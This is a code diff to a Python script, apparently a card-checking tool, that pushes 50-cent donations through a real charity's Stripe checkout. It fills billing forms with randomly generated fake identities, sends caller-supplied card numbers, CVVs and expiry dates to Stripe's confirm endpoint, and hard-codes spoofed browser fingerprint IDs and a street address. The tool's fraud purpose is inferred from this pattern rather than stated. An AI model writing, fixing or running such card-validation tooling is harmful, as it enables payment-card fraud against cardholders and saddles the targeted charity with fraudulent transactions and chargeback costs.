@@ -5,42 +5,42 @@ from mills.classes.rand_user import RandUser
 
 
 def ck_one(r):
-    rand_user = RandUser().rand_user()
-    a = r.get(f'https://www.bintwinning.org/donate/')
-    if not a:return
-    b_data = {
-'total_donation': '0.50',
-'small': '0',
-'medium': '0',
-'large': '0',
-'commercial': '0',
-}   
-    b = r.post('https://www.bintwinning.org/donation/store/', b_data)
-    if not b: return
+#     rand_user = RandUser().rand_user()
+#     a = r.get(f'https://www.bintwinning.org/donate/')
+#     if not a:return
+#     b_data = {
+# 'total_donation': '0.50',
+# 'small': '0',
+# 'medium': '0',
+# 'large': '0',
+# 'commercial': '0',
+# }   
+#     b = r.post('https://www.bintwinning.org/donation/store/', b_data)
+#     if not b: return
     
-    c_data = {
-'title': 'Mr',
-'forename': rand_user['first_name'],
-'surname': rand_user['last_name'],
-'organisation': '',
-'address_line_1': rand_user['street'],
-'address_line_2': '',
-'town': rand_user['city'],
-'county': rand_user['state'],
-'postcode': rand_user['zip'],
-'country': 'US',
-'email': rand_user['email'],
-'confirm_email': rand_user['email'],
-'phone_number': rand_user['phone'],
-'supporter_type': 'individual',
-'found_us_via': 'Other',
-'event_source': '',
-}
-    c = r.post('https://www.bintwinning.org/checkout/billing/update/', c_data)
-    if not c: return
+#     c_data = {
+# 'title': 'Mr',
+# 'forename': rand_user['first_name'],
+# 'surname': rand_user['last_name'],
+# 'organisation': '',
+# 'address_line_1': rand_user['street'],
+# 'address_line_2': '',
+# 'town': rand_user['city'],
+# 'county': rand_user['state'],
+# 'postcode': rand_user['zip'],
+# 'country': 'US',
+# 'email': rand_user['email'],
+# 'confirm_email': rand_user['email'],
+# 'phone_number': rand_user['phone'],
+# 'supporter_type': 'individual',
+# 'found_us_via': 'Other',
+# 'event_source': '',
+# }
+#     c = r.post('https://www.bintwinning.org/checkout/billing/update/', c_data)
+#     if not c: return
 
-    d = r.post('https://www.bintwinning.org/checkout/confirmed/', {})
-    if not d: return
+#     d = r.post('https://www.bintwinning.org/checkout/confirmed/', {})
+#     if not d: return
 
     e = r.post('https://api.bintwinning.org/api/stripe/payment-intent-secret',{'amount': 50})
     if not e: return
@@ -55,20 +55,7 @@ def ck_one(r):
 
 
 def ck_two(sec, req_sec, cc, mes,ano, cvv):
-    payload_e = {
-'payment_method_data[type]': 'card',
-'payment_method_data[card][number]': cc,
-'payment_method_data[card][cvc]': cvv,
-'payment_method_data[card][exp_month]': mes,
-'payment_method_data[card][exp_year]': ano,
-'payment_method_data[pasted_fields]': 'number',
-'payment_method_data[payment_user_agent]': 'stripe.js/394a74bde; stripe-js-v3/394a74bde',
-'payment_method_data[time_on_page]': '52031',
-'expected_payment_method_type': 'card',
-'use_stripe_sdk': 'true',
-'key': 'pk_live_51AKkHXJ7SuHQfYVEX6zZEzlUObvoL8SxDSnf9cze3NTkrDEMEson8SQ3keLlzyjsxgyqZibT15BNnUhQ5lnDnND2007e0ee73t',
-'client_secret': sec,
-}
+    payload_e = "payment_method_data%5Btype%5D=card&payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=12%2BOwen%2BClose&payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=Fareham&payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=Hampshire&payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=PO16%2B7GZ&payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=GB&payment_method_data%5Bcard%5D%5Bnumber%5D="+cc+"&payment_method_data%5Bcard%5D%5Bcvc%5D="+cvv+"&payment_method_data%5Bcard%5D%5Bexp_month%5D="+mes+"&payment_method_data%5Bcard%5D%5Bexp_year%5D="+ano+"&payment_method_data%5Bguid%5D=183c0835-7aa9-4954-90fd-c57689a7e6863737af&payment_method_data%5Bmuid%5D=aa2ee6cd-4e8c-455f-9a9a-964896004c8a5b3ac6&payment_method_data%5Bsid%5D=29415450-271f-46f0-8716-d2b023a5c56d364687&payment_method_data%5Bpayment_user_agent%5D=stripe.js%2F1da9d2ae51%3B%2Bstripe-js-v3%2F1da9d2ae51&payment_method_data%5Btime_on_page%5D=91702&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51AKkHXJ7SuHQfYVEff0D7BEvZYFBpz0XiO6An44eh6tumFgMU0JZwlRJHOEdZABNlly1bZ8bUhJK3ElRJvoMtmjX00o4GILGCB&client_secret="+sec
 
     e = requests.post(f'https://api.stripe.com/v1/payment_intents/{req_sec}/confirm', data = payload_e)
     return e.json()
